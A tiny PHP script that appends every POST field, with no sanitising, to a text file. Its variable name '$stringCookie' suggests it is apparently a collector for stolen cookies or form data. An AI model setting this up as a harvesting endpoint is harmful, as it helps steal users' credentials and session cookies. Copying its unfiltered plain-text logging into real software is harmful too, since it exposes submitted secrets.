<?php 

$stringCookie = "";
foreach($_POST as $key => $value) {
    $stringCookie .= "&".$key ."=".$value;
}

$fp = fopen('formdata.txt', 'a');
fwrite($fp, $stringCookie);
fclose($fp);
